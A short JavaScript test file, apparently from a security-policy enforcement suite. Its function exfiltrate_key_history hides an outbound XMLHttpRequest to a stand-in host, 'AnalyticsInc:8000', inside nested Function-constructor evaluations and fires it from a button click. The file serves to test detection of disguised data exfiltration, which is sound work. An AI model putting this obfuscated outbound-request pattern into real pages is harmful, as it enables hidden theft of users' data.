// exfil_test_func_nested2.js
function exfiltrate_key_history() {
  var nest = new String('var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest2", true);xmlhttp.send(null);\';return Function(exp);');
  var top$$1 = JAM.call(Function, null, [nest]);
  var sub = top$$1();
  sub();
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
